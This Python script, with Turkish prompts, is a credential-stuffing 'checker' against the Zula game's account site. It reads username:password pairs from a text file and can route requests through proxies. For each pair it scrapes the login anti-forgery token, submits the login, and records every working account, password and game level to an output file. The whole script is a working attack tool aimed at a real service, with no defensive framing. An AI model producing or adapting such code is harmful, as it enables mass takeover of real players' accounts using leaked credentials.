import requests
import re
from colorama import Fore, Style
from os import system

def show_interface():
    system("cls||clear")

def format_proxy(proxy):
    parts = proxy.split(":")
    if len(parts) == 2:
        return f"http://{proxy}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    else:
        print("Hata: Geçersiz proxy adresi formatı.")
        return None

def get_proxy():
    use_proxy = input("Proxy kullanmak istiyor musunuz? (Evet/Hayır): ").lower()
    if use_proxy == "evet":
        proxy_str = input("Proxy bilgisini girin (host:port:username:password): ")
        return format_proxy(proxy_str)
    else:
        return None

def read_credentials_from_file(filename):
    credentials = []
    try:
        with open(filename, "r", encoding="utf-8") as file:
            for line in file:
                line = line.strip()
                if ":" in line:
                    username, password = line.split(":")
                    credentials.append((username, password))
    except FileNotFoundError:
        print(f"{filename} dosyası bulunamadı. Lütfen dosyanın varlığını kontrol edin.")
    return credentials

def main():
    while True:
        show_interface()
        print("Klasör açıp hesap.txt oluşturmayı unutmayın!")
        choice = input("Devam etmek için 1'e basın, çıkış yapmak için Q'ya basın: ")
        if choice.lower() == 'q':
            break

        headers = {
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'Referer': 'https://hesap.zulaoyun.com/',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
        }

        proxy = get_proxy()
        proxies = {"http": proxy, "https": proxy} if proxy else None

        credentials = read_credentials_from_file("hesap.txt")
        if not credentials:
            continue

        for username, password in credentials:
            client = requests.Session()
            while True:
                response = client.get('https://hesap.zulaoyun.com/', headers=headers, proxies=proxies)
                response_text = response.text

                right_string_token = 'name="__RequestVerificationToken" type="hidden" value="'
                left_string_token = '"'
                start_index_token = response_text.find(right_string_token)
                if start_index_token != -1:
                    start_index_token += len(right_string_token)
                    end_index_token = response_text.find(left_string_token, start_index_token)
                    token = response_text[start_index_token:end_index_token]
                    print("Token:", token)
                else:
                    token = None

                if token:
                    data = {
                        '__RequestVerificationToken': token,
                        'ReturnUrl': '/',
                        'UserName': username,
                        'Password': password,
                        'RememberMe': 'false',
                    }

                    try:
                        response_login = client.post('https://hesap.zulaoyun.com/zula-giris-yap', headers=headers, data=data, proxies=proxies)
                        response_text_login = response_login.text

                        if "Token eksik" in response_text_login:
                            print("Token eksik, yeniden dene.")
                        elif "Kullanıcı adı ya da şifre yanlış." in response_text_login:
                            print(f"Yanlış kullanıcı adı veya şifre: {username}")
                            break
                        elif "PROFİL" in response_text_login:
                            print(f"Başarılı giriş: Kullanıcı adı: {username}, Şifre: {password}")

                            response_profil = client.get('https://hesap.zulaoyun.com/profil', headers=headers, proxies=proxies)
                            response_text_profil = response_profil.text

                            match_level = re.search(r'UserGameLevel\':"(.*?)"', response_text_profil)
                            if match_level:
                                level = match_level.group(1)
                                print("Level:", level)

                                with open("basarilihesaplar.txt", "a", encoding="utf-8") as file:
                                    file.write(f"Kullanıcı Adı: {username}, Şifre: {password}, Level: {level}\n")
                            else:
                                print("Level bulunamadı")
                            break
                        else:
                            print("Hata var")
                            break
                    except requests.RequestException as e:
                        print(f"Bir hata oluştu: {e}")
                        break
                else:
                    print("Token eksik, yeniden dene.")

if __name__ == "__main__":
    main()
